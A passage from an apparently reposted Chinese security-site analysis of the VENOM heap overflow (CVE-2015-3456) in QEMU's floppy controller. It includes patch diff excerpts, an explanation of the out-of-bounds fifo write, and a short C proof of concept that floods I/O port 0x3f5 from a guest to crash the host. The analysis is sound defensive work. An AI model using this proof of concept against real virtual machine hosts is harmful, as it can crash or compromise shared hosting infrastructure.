28.  ‐    if (fdctrl‐&gt;fifo[fdctrl‐&gt;data_pos ‐ 1] &amp; 0x80) {
29.  +    pos = fdctrl‐&gt;data_pos ‐ 1;
30.  +    pos %= FD_SECTOR_LEN;
31.  +    if (fdctrl‐&gt;fifo[pos] &amp; 0x80) {
32.           /* Command parameters done */
33.  ‐        if (fdctrl‐&gt;fifo[fdctrl‐&gt;data_pos ‐ 1] &amp; 0x40) {
34.  +        if (fdctrl‐&gt;fifo[pos] &amp; 0x40) {
35.               fdctrl‐&gt;fifo[0] = fdctrl‐&gt;fifo[1];
36.               fdctrl‐&gt;fifo[2] = 0;
37.               fdctrl‐&gt;fifo[3] = 0;
38.  @@ ‐1955,7 +1958,7 @@ static uint8_t command_to_handler[256];
39.   static void fdctrl_write_data(FDCtrl *fdctrl, uint32_t value)
40.   {
41.       FDrive *cur_drv;
42.  ‐    int pos;
43.  +    uint32_t pos;
44.
45.       /* Reset mode */
46.       if (!(fdctrl‐&gt;dor &amp; FD_DOR_nRESET)) {
47.  @@ ‐2004,7 +2007,9 @@ static void fdctrl_write_data(FDCtrl *fdctr
l, uint32_t value)
48.       }
49.
50.       FLOPPY_DPRINTF("%s: %02x\n", __func__, value);
51.  ‐    fdctrl‐&gt;fifo[fdctrl‐&gt;data_pos++] = value;
52.  +    pos = fdctrl‐&gt;data_pos++;
53.  +    pos %= FD_SECTOR_LEN;
54.  +    fdctrl‐&gt;fifo[pos] = value;
55.       if (fdctrl‐&gt;data_pos == fdctrl‐&gt;data_len) {
56.           /* We now have all parameters
57.            * and will be able to treat the command</pre>
<p>&nbsp;</p>
<p>{ FD_CMD_DRIVE_SPECIFICATION_COMMAND, 0xff, “DRIVE SPECIFICATION COMMAND”, 5, fdctrl_handle_drive_specification_command }可以看到基本上就是补了一些对fdctrl-&gt;fifo这个buffer下标的一些防止越界的操作。</p>
<p>我们可以肯定这个肯定是个写越界操作了。</p>
<p>按照这个思路我们查看了所有命令的处理函数，发现FD_CMD_DRIVE_SPECIFICATION_COMMAND的处理函数有问题。</p>
<p>先看下FD_CMD_DRIVE_SPECIFICATION_COMMAND命令的Handler,如下:</p>
<p>命令处理函数为fdctrl_handle_drive_specification_command，参数个数为5。</p>
<p>再来看下fdctrl_handle_drive_specification_command函数的实现：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/05/qemu_7.png"><img class="alignnone size-full wp-image-6615" src="http://www.secpulse.com/wp-content/uploads/2015/05/qemu_7.png" alt="qemu_7" width="618" height="529" /></a></p>
<p>&nbsp;</p>
<p>我们找到fdctrl-&gt;data_len &gt; 7这个判断是有问题的。</p>
<p>我们从fdctrl_write_data这个函数开始，首先传进命令字节FD_CMD_DRIVE_SPECIFICATION_COMMAND，然后依次传进5个参数。按照fdctrl_write_data的流程进入处理函数fdctrl_handle_drive_specification_command时fdctrl-&gt;data_len 应该是6，所以我们让fdctrl_handle_drive_specification_command的第一个判断里fdctrl-&gt;fifo[fdctrl-&gt;data_pos – 1]是我们可控的再加上下面的这个fdctrl-&gt;data_len &gt; 7这个判断也为否，就绕过了所有调用fdctrl_set_fifo和fdctrl_reset_fifo的地方就是控制器的状态还是可写，而且buffer没有被清空。</p>
<p>然后我们就可以无限次向fdctrl-&gt;fifo里写入数据，从而超出fdctrl-&gt;fifo的边界造成越界写。</p>
<p>fdctrl-&gt;fifo的初始化是在fdctrl_realize_common里面:</p>
<pre class="theme:sublime-text lang:c decode:true">  static void fdctrl_realize_common(FDCtrl *fdctrl, Error **errp){
     //
     // qemu_memalign最终会调用malloc分配内存
     //
     fdctrl‐&gt;fifo = qemu_memalign(512, FD_SECTOR_LEN);
     fdctrl‐&gt;fifo_size = 512;
  }</pre>
<h2> 5.可重现POC</h2>
<pre class="theme:sublime-text lang:c decode:true"> #include &lt;sys/io.h&gt;
 #define FIFO 0x3f5
 int main() {
         int i;
         iopl(3);
         outb(0x8e,0x3f5); /* READ ID */
         for (i=0;i&lt;10000000;i++)
                  outb(0x42,0x3f5); /* push */
  }</pre>
<p>&nbsp;</p>
<h2>6.重现成功</h2>
<p>linux guest:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/05/qemu_8.png"><img class="alignnone size-full wp-image-6616" src="http://www.secpulse.com/wp-content/uploads/2015/05/qemu_8.png" alt="qemu_8" width="563" height="235" /></a></p>
<p>&nbsp;</p>
<p>windows guest:</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/05/qemu_9.png"><img class="alignnone size-full wp-image-6617" src="http://www.secpulse.com/wp-content/uploads/2015/05/qemu_9.png" alt="qemu_9" width="557" height="445" /></a></p>
<p>&nbsp;</p>
<h1></h1>
<h2>漏洞总结</h2>
<p>这个漏洞为典型的堆溢出漏洞，其表现形式为越界写操作。<span style="color: #ff0000;"><strong>此漏洞的利用可能还是很大的。另外即使虚拟机没有设置软驱，其漏洞还是无法避免的。鉴于该漏洞属于高危漏洞，建议尽快在源码层面上对QEMU实现补丁升级。</strong></span></p>
<p><em>[1]此漏洞原作者博客 http://venom.crowdstrike.com/</em></p>
<p><em>[2] IO端口0x3F6是ATA（硬盘）备用状态寄存器，并且不使用任何软盘控制器。</em></p>
<p>&nbsp;</p>
<p>【原文:<a href="http://blogs.360.cn/blog/venom-%E6%AF%92%E6%B6%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88qemu-kvm-cve%E2%80%902015%E2%80%903456%EF%BC%89/" target="_blank">VENOM “毒液”漏洞分析（qemu kvm CVE‐2015‐3456）</a> 作者：progmboy、noirfate、cyg07 <a href="http://www.secpulse.com/archives/6602.html" target="_blank">安全脉搏TeacherYang</a>整理发布】</p>
		<div class="pageShenming">
【安全脉搏：分享技术、悦享品质。文章仅代表作者看法，如有不同观点，欢迎添加安全脉搏微信号：SecPulse，进行交流。】</div>
<div class="post-tags"><span>Tags: </span><a href="https://www.secpulse.com/archives/tag/%e6%af%92%e6%b6%b2%e6%bc%8f%e6%b4%9e" rel="tag">“毒液”漏洞</a><a href="https://www.secpulse.com/archives/tag/%e6%af%92%e6%b6%b2%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" rel="tag">“毒液”漏洞分析</a><a href="https://www.secpulse.com/archives/tag/0x3f6" rel="tag">0x3F6</a><a href="https://www.secpulse.com/archives/tag/crowdstrike" rel="tag">CrowdStrike</a><a href="https://www.secpulse.com/archives/tag/cve-2015-3456" rel="tag">CVE-2015-3456</a><a href="https://www.secpulse.com/archives/tag/cyg07" rel="tag">cyg07</a><a href="https://www.secpulse.com/archives/tag/data_fifo" rel="tag">DATA_FIFO</a><a href="https://www.secpulse.com/archives/tag/fdctrl_handle_readid" rel="tag">fdctrl_handle_readid</a><a href="https://www.secpulse.com/archives/tag/fdctrl_write_data" rel="tag">fdctrl_write_data</a><a href="https://www.secpulse.com/archives/tag/fifo-0x3f5" rel="tag">FIFO 0x3f5</a><a href="https://www.secpulse.com/archives/tag/marcus-meissner" rel="tag">Marcus Meissner</a><a href="https://www.secpulse.com/archives/tag/noirfate" rel="tag">noirfate</a><a href="https://www.secpulse.com/archives/tag/progmboy" rel="tag">progmboy</a><a href="https://www.secpulse.com/archives/tag/qemu" rel="tag">QEMU</a><a href="https://www.secpulse.com/archives/tag/qemu-kvm-cve%e2%80%902015%e2%80%903456" rel="tag">qemu kvm CVE‐2015‐3456</a><a href="https://www.secpulse.com/archives/tag/venom" rel="tag">VENOM</a><a href="https://www.secpulse.com/archives/tag/venom%ef%bc%88cve-2015-3456%ef%bc%89" rel="tag">VENOM（CVE-2015-3456）</a><a href="https://www.secpulse.com/archives/tag/%e5%a0%86%e6%ba%a2%e5%87%ba%e6%bc%8f%e6%b4%9e" rel="tag">堆溢出漏洞</a><a href="https://www.secpulse.com/archives/tag/%e6%af%92%e6%b6%b2" rel="tag">毒液</a><a href="https://www.secpulse.com/archives/tag/%e6%af%92%e6%b6%b2venom" rel="tag">毒液VENOM</a><a href="https://www.secpulse.com/archives/tag/%e8%b6%8a%e7%95%8c%e5%86%99%e6%93%8d%e4%bd%9c" rel="tag">越界写操作</a><a href="https://www.secpulse.com/archives/tag/%e9%ab%98%e5%8d%b1%e6%bc%8f%e6%b4%9e" rel="tag">高危漏洞</a></div>
		</div>
	<!-- .single-content -->
		<div class="pageActive">
	<div class="mark-like-btn">
							</div>
	<!-- Baidu Button BEGIN -->
	<div class="bdshare">
		<div class="bdsharebuttonbox">
			<a href="#" class="bds_more" data-cmd="more"></a><a href="#"
				class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#"
				class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#"
				class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
		</div>
		<script>
		window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};
		with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
		</script>

	</div>
</div>    <section id="text-6" class="widget-container widget_text hidden-xs">			<div class="textwidget"><center><a href="https://www.duoyinsu.com" target="_blank" title="安识科技 专业安全服务商"><img src="https://www.secpulse.com/wp-includes/images/secweixin.png" style="width:785px;height:315px"></a><center></div>
		</section><section id="related_post-2" class="widget-container widget_related_post hidden-xs"><h3 class="widget-title">相关文章</h3>

	<ul class="related_post">
				<li><a href="https://www.secpulse.com/archives/55541.html" title="详细阅读 QEMU高危漏洞可执行任意代码 影响国内多家公有云平台">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/02/223333333333333333333.jpg&h=150&w=249&zc=1" alt="QEMU高危漏洞可执行任意代码 影响国内多家公有云平台" class="xg-img"/>
		<p>QEMU高危漏洞可执行任意代码 影响国内&hellip;</P></a></li>
				<li><a href="https://www.secpulse.com/archives/40965.html" title="详细阅读 中国电信车联网服务平台存在弱口令且有高危漏洞可远程控制（可观看驾驶室内情况录像）">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=http://www.secpulse.com/upload/201508/11225154daa482dafcaa447b6de3ef2f2b5f46fa.jpg&h=150&w=249&zc=1" alt="中国电信车联网服务平台存在弱口令且有高危漏洞可远程控制（可观看驾驶室内情况录像）" class="xg-img"/>
		<p>中国电信车联网服务平台存在弱口令且有高危&hellip;</P></a></li>
				<li><a href="https://www.secpulse.com/archives/12837.html" title="详细阅读 国家信息中心信息安全研究与服务中心挖掘高危漏洞，可导致服务器沦陷">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=/upload/201211/301732228dd067beb8fd77405fe277835f4a20bf.jpg&h=150&w=249&zc=1" alt="国家信息中心信息安全研究与服务中心挖掘高危漏洞，可导致服务器沦陷" class="xg-img"/>
		<p>国家信息中心信息安全研究与服务中心挖掘高&hellip;</P></a></li>
			</ul>


</section></article>


<!-- 引用 -->
<div id="comments" class="comments-area">
	<h2 class="comments-title">
		抢沙发
	</h2>
			<div id="respond" class="comment-respond row">
		


			<form action="https://www.secpulse.com/wp-comments-post.php" method="post" id="commentform">
		
				
						
			<div id="comboxinfo">
					<div class="cominfodiv cominfodiv-author ">
					<p for="author" class="nicheng">
     <input type="text" name="author" id="author" class="texty" value="" tabindex="1" /> <span class="required">昵称*</span>
      </p>
</div>
					<div class="cominfodiv cominfodiv-email">
					<p for="email">	<input type="text" name="email" id="email" class="texty" value="" tabindex="2" /> <span class="required">邮箱*</span>
						</p>
					</div>
					<div class="cominfodiv cominfodiv-url">
					 	<p for="url"><input type="text" name="url" id="url" class="texty" value="" tabindex="3" /><span>网址 </span>
						</p>
					</div>
					
			
				
</div>		       <div class=" cominfodiv-nr">  
<textarea class="texty" name="w" id="comment" rows="10" tabindex="4" placeholder="输入评论内容..."></textarea><textarea name="comment" cols="100%" rows="4" style="display:none"></textarea>
							<div class="submitcom">
							
					<input id="submit" name="submit" type="submit" tabindex="5" value="提&nbsp;交"/>
					<input type='hidden' name='comment_post_ID' value='6602' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="451cccb801" /></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="58"/></p>				</div>
				<div id="cancel_comment_reply"><a rel="nofollow" id="cancel-comment-reply-link" href="/archives/6602.html#respond" style="display:none;">取消回复</a></div>
			
</div>
			
				
			</form>
			
			
			<script type="text/javascript">
				document.getElementById("comment").onkeydown = function (moz_ev){
				var ev = null;
				if (window.event){
				ev = window.event;
				}else{
				ev = moz_ev;
				}
				if (ev != null && ev.ctrlKey && ev.keyCode == 13){
				document.getElementById("submit").click();}
				}
			</script></div>
	 		
</div>
<!-- #comments --></div>
		
<div class="xs-right sidebar xs-hidden xss-hidden">
	<div class="authorbox">
	<div class="author-top">
<div id="author-img">
<img src="https://www.secpulse.com/wp-content/uploads/2015/03/20150209111230547-150x150.jpg" width="96" height="96" alt="TeacherYang" class="avatar avatar-96 wp-user-avatar wp-user-avatar-96 alignnone photo" />
</div>
<div class="au-name">
<a href="https://www.secpulse.com/archives/author/teacheryang" title="由TeacherYang发布" rel="author">TeacherYang</a><br>
 <span class="au-title">总共15篇文章</span>
</div> </div>
	<div class="author-word"><span class="quotes q1"></span>
Best teacher of China	<span class="quotes q2"></span></div>
	</div>
	
				<aside id="recent-posts-2" class="widget-container widget_recent_entries">		<div class="si-title"><h2>最新脉搏</h2></div>		<ul>
					<li>
				<a href="https://www.secpulse.com/archives/60653.html">《安天365安全研究》第5期</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60630.html">供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60605.html">2017先知创新大会：有ZHI而来</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60576.html">甲方工作杂谈</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60394.html">Catfish—缓存漏洞&#038;&#038;配合CSRF到Getshell</a>
						</li>
				</ul>
		</aside><aside id="hot_comment-3" class="widget-container widget_hot_comment"><div class="si-title"><h2>脉搏热评</h2></div>
	<ul class="hot_comment_widget">
		
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59497.html" rel="bookmark" title="XSS挑战之旅学习总结 (7条评论)" >XSS挑战之旅学习总结</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59065.html" rel="bookmark" title="web安全之如何全面发现系统后台 (6条评论)" >web安全之如何全面发现系统后台</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59770.html" rel="bookmark" title="电商的支付风控怎么玩？ (3条评论)" >电商的支付风控怎么玩？</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59466.html" rel="bookmark" title="安天移动安全联合猎豹揭秘无形之贼Dosoft免杀病毒 (2条评论)" >安天移动安全联合猎豹揭秘无形之贼Doso&hellip;</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59262.html" rel="bookmark" title="跟着DVWA学Web安全开发 (2条评论)" >跟着DVWA学Web安全开发</a></li>			</ul>

</aside><aside id="random_post-2" class="widget-container widget_random_post"><div class="si-title"><h2>随机脉搏</h2></div>

	<ul class="random_post">
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/18826.html" rel="bookmark" title="详细阅读 中粮某分站上传漏洞导致服务器沦陷项目信息外泄">中粮某分站上传漏洞导致服务器沦陷项目信息外泄</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/46879.html" rel="bookmark" title="详细阅读 国泰君安某系统多个sql注入漏洞打包">国泰君安某系统多个sql注入漏洞打包</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/21628.html" rel="bookmark" title="详细阅读 Thinksaas SQL注入漏洞">Thinksaas SQL注入漏洞</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/13781.html" rel="bookmark" title="详细阅读 安居客房产证sql注入漏洞">安居客房产证sql注入漏洞</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/42469.html" rel="bookmark" title="详细阅读 destoon waf 绕过漏洞 （二）">destoon waf 绕过漏洞 （二）</a></li>
					</ul>


</aside><aside id="text-11" class="widget-container widget_text"><div class="si-title"><h2>脉搏官方微信公众号</h2></div>			<div class="textwidget"><img src="https://www.secpulse.com/wp-includes/images/SecPulse.png" width="280px" height="364px" /></div>
		</aside>				</div>
	</div>

	</section>

  <div class="inner row visible-lg-block">

	<div class="friends">
		<h3>友情链接</h3>
		<ul>
			<li><a href="https://xianzhi.aliyun.com/forum/?secpulse" target="_blank">先知安全社区</a><span>|</span></li>
			<li><a href="https://threathunter.org/" target="_blank">ThreatHunter社区</a><span>|</span></li>
			<li><a href="http://www.ijiandao.com/" target="_blank">网络尖刀</a><span>|</span></li>
			<li><a href="http://navisec.it/" target="_blank">NaviSec导航</a><span>|</span></li>
		    <li><a href="https://www.easyaq.com/" target="_blank">E安全</a><span>|</span></li>
			<li><a href="http://www.sec-wiki.com/" target="_blank">Sec-Wiki</a><span>|</span></li>
			<li><a href="http://www.waitalone.cn/" target="_blank">独自等待</a><span>|</span></li>
			<li><a href="http://www.shellsec.com/" target="_blank">神刀网</a><span>|</span></li>
			<li><a href="http://www.ineice.com/" target="_blank">爱内测</a><span>|</span></li>
			<li><a href="http://www.itet.cn/" target="_blank">北京ITET培训中心</a><span>|</span></li>
			<li><a href="http://www.ihonker.org/" target="_blank">中国红客联盟</a><span>|</span></li>
			<li><a href="http://www.bigniu.com/" target="_blank">比戈大牛</a><span>|</span></li>
			<li><a href="http://www.tiejiang.org/" target="_blank">铁匠运维网</a><span>|</span></li>
			<li><a href="http://www.nagain.com" target="_blank">娜迦信息</a><span>|</span></li>
			<li><a href="https://www.secsilo.com/" target="_blank">SecSilo</a><span>|</span></li>
			<li><a href="https://team.armyzer0.com" target="_blank">armyzer0</a><span>|</span></li>
			<li><a href="http://www.nosafe.org" target="_blank">NoSafe</a></li>
		</ul>
	</div>

	<div class="friends">
		<h3>合作伙伴</h3>
		<ul>
			<a href="https://www.duoyinsu.com" class="external" target="_blank">
				<img src="https://www.secpulse.com/wp-content/uploads/anshi-logo.png"
				alt="安识科技" width="150px" height="45px">
			</a>
			<a href="http://aq.163.com/module/partner.html" class="external"
				target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/netease.jpg"
				alt="网易安全中心" width="150px" height="45px">
			</a>
			<a href="https://security.alibaba.com/" class="external"
				target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/asrc.jpg"
				alt="阿里安全中心" width="150px" height="45px">
			</a>
			
			<a href="http://yaq.qq.com/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/yaqnew.png" alt="腾讯御安全"
				width="140px" height="45px">
			</a>
			
			<a href="http://www.4hou.com" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/4hou.png"
				alt="嘶吼RoarTalk" width="150px" height="45px">
			</a>
			
			<a href="http://www.ichunqiu.com/?from=secpulse" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/ichunqiu.png" alt="i春秋学院"
				width="140px" height="45px">
			</a>

			<a href="#" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/bigsec.png" alt="bigsec岂安科技"
				width="140px" height="45px">
			</a>
		
			<a href="http://www.milw0rm.cn/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/milw0rm.png"
				alt="Milw0rm Team" width="120px" height="40px">
			</a>


			<a href="#" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/cloversec.png"
				alt="四叶草安全" width="130px" height="45px">
			</a>
			<a href="https://www.aqdog.com" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/aqdog.png"
				alt="安犬云平台" width="140px" height="45px">
			</a>
			
			<a href="http://www.e365.org/" class="external" target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/e365.png"
				alt="易安在线" width="130px" height="45px">
			</a>
			
			
			

		</ul>
	</div>
</div>
<footer class="footer clr" id="footer">
	<div class="inner inner-footer">
		<div class="footer-secpulse">
			<h3>SecPulse</h3>
			<ul>
				<li><a href="/about">关于SecPulse</a></li>
				<!--<li><a href="http://test.secpulse.com">SecPulse专测</a> <sup>NEW!</sup></li>-->
				<li><a href="/hire">加入我们</a></li>
				<li><a href="/report">寻求报道</a></li>
				<li><a href="/contact-us">联系我们</a></li>
			</ul>
		</div>
		<div class="footer-subscribe xs-hidden">
			<h3>订阅</h3>
			<ul>
				<li><a href="/feed">RSS订阅</a></li>
				<li><a href="/feed">邮箱订阅</a></li>
				<li><a href="/feed">线下活动订阅</a></li>
				<li></li>
				<li><a href="http://weibo.com/311057789">官方微博</a></li>
				<!-- <li><a href="https://twitter.com/secpulse">Twitter</a></li> -->
			</ul>
		</div>
		<div class="footer-partner">
			<h3>全力驱动</h3>
			<ul class="cf">
				<li><a href="https://www.secpulse.com" class="external"
					target="_blank"><img
						src="https://www.secpulse.com/wp-content/uploads/seclogo.png"
						alt="安全脉搏" width="200px"></a></li>
			</ul>
		</div>
		<div class="footer-copyright xs-hidden">
			<p>本站由SecPulse安全脉搏团队全力维护。</p>
			<p>
				Powered By <a title="安全脉搏" href="https://www.secpulse.com">SecPulse</a>
			</p>
			<p>©2013-2017 安全脉搏</p>
			<p>沪ICP备16016474号</p>
			<img src="https://www.secpulse.com/wp-includes/images/qrcode.jpg"
				alt="Qrcode" height="150px" width="150px">

		</div>
	</div>
</footer>
<div id="shangxia">
	<div id="shang" title="↑ 返回顶部"></div>
              <div id="comt" title="查看评论"></div>
              <div id="xia" title="↓ 移至底部"></div>
</div>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/plugins/akismet/_inc/form.js?ver=3.1.2'></script>
</body>

</html>
